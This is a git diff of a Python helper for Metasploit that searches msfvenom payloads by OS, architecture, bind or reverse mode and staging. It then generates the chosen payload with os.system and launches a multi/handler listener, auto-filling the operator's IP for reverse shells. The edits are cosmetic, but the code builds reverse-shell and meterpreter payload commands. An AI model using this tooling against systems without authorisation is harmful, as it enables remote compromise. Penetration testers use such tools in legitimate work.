@@ -89,8 +89,6 @@ def print_available_payloads(keywords,payload_list):
 	            break
 	    if all(match):
 	        avail_payloads |= temp_payloads
-	#print("match is:", match)
-	#print("available payloads", avail_payloads)
 	
 	if avail_payloads:
 	    print(Green("[+] Available payloads: {}".format(len(avail_payloads))))
@@ -101,11 +99,11 @@ def print_available_payloads(keywords,payload_list):
 	    
 	else:
             print("[!] Sorry, no payload found, please check your inputs / combination")
-            n= input(Green("Do you want to relax filters (O/n) ? : "))
+            n= input(Green("Do you want to broaden your search (O/n) ? : "))
             if n =="n":
                 sys.exit(-1)
             else:
-                # Relaxing filter by removing BIND and STAGED items
+                # Broaden search by removing BIND and STAGED items
                 keywords = keywords.replace('bind','').replace('staged','').strip()
                 print(Green("Searching again with : "),  keywords)
                 #test again for results
@@ -128,9 +126,6 @@ def generate_payload(params,number,avail_payloads):
     
     pname = " ".join([K_TYPE, K_ARCH,K_MET, K_BIND,K_STAGE,IP,str(PORT)]).replace(" ","-") # pretify pname
     pname = "_" + pname # fast trick to remove all payload in dir via rm _*
-    print(pname)
-
-        
     
     if "cmd/" in payload_cmd or "vbs" in payload_cmd:
         K_TYPE=""
@@ -153,7 +148,7 @@ def generate_payload(params,number,avail_payloads):
         payload="msfvenom -p {} {}={} LPORT={} -f elf -o {}".format(payload_cmd,HOST, IP,PORT,pname+".elf")
     
     print("="*150)
-    print("[*] Generating Payload")
+    print(Green("[*] Generating Payload"))
     print("        -> ",payload)
     print("[*] Please wait ...")    
     os.system(payload)
@@ -165,9 +160,6 @@ def generate_payload(params,number,avail_payloads):
     else:
     # For reverse shell
         if 'meterpreter' in payload : # meterpreter shells
-            #msf_cmd= "msfconsole -x \'use multi/handler; set LHOST {}; set LPORT {}; run\'".format(IP,PORT)
-            #msf_cmd= "msfconsole -x 'use multi/handler; set LHOST {}; set LPORT {}; run' ".format(IP,PORT)
-            
             msf_cmd ='''use multi/handler
             set LHOST {}
             set LPORT {}
@@ -175,6 +167,7 @@ def generate_payload(params,number,avail_payloads):
             with open("listener.rc","w") as f:
                 f.write(msf_cmd)
             
+            print(Green("[+] Saved Listener for later use as listener.rc"))
             print(Green("[*] Launching Metasploit ..."))
             # Launch metasploit in another terminal
             # works only in Kali OR OS with Qterminal
@@ -204,11 +197,10 @@ if __name__ == "__main__":
     "win" : "windows",
     "lin" : "linux",
     "web" : ["asp","php","tomcat","java"],
-    #'script' : ['py', 'ps1', 'pl' ]
-     }
+    }
     
     if not args.SHELL_TYPE:
-        # Special case when we are targeting other Os like android, unix, Mac via --keyword Arg
+        # Special case when we are targeting other OS like android, unix, Mac via --keyword Arg
         K_TYPE =""
         K_EXT=""
     else:
@@ -222,10 +214,10 @@ if __name__ == "__main__":
             # Paylaod is WEB 
             K_TYPE =""
             print(Green("[+] Available web payloads: 1.PHP 2.WIN-ASP 3.Java-WAR 4.Java-JSP"))
-               
             ext_list = ['php', 'asp','war','jsp']
             K_WEB = int(input(Green("[*] Enter your specific type of payload : ")))
             K_EXT= ext_list[K_WEB-1]
+            
             if K_EXT == "war" or K_EXT == "jsp":
                 K_TYPE = "java"
             elif K_EXT == "php":
@@ -246,8 +238,6 @@ if __name__ == "__main__":
     K_STAGE = " " if args.stageless else "staged"
     
     keywords_string= " ".join([K_TYPE,K_ARCH,K_MET, K_BIND, K_STAGE, K_KEY])     
-    
-    
     if args.SHELL_TYPE =="web":
         # WEB payloads don't have K_ARCH, K_STAGE mentionned
         # We should remove those keywords 
@@ -256,7 +246,6 @@ if __name__ == "__main__":
         keywords_string = keywords_string.replace(K_EXT,'')
         
     print(Green("[*] Searching payloads with Keywords: {}".format(keywords_string))) # for debug
-    # Print available payloads
     avail_payloads = print_available_payloads(keywords_string,payload_list)    
     i= int(input("[*] Please enter your payload number: "))
         
@@ -268,7 +257,7 @@ if __name__ == "__main__":
         if K_BIND=="bind" :
             IP=input("[*] Enter the IP target: ")
         else:
-            # For reverse shell, automatically fill-in IP 
+            # For reverse shell, automatically fill-in with our IP 
             IP = subprocess.check_output(["hostname -I | awk '{print $1}'"], shell=True).decode().strip()
             #IP = subprocess.Popen("hostname -I | awk '{print $1}'", shell=True, stdout=subprocess.PIPE).stdout
     if args.port :
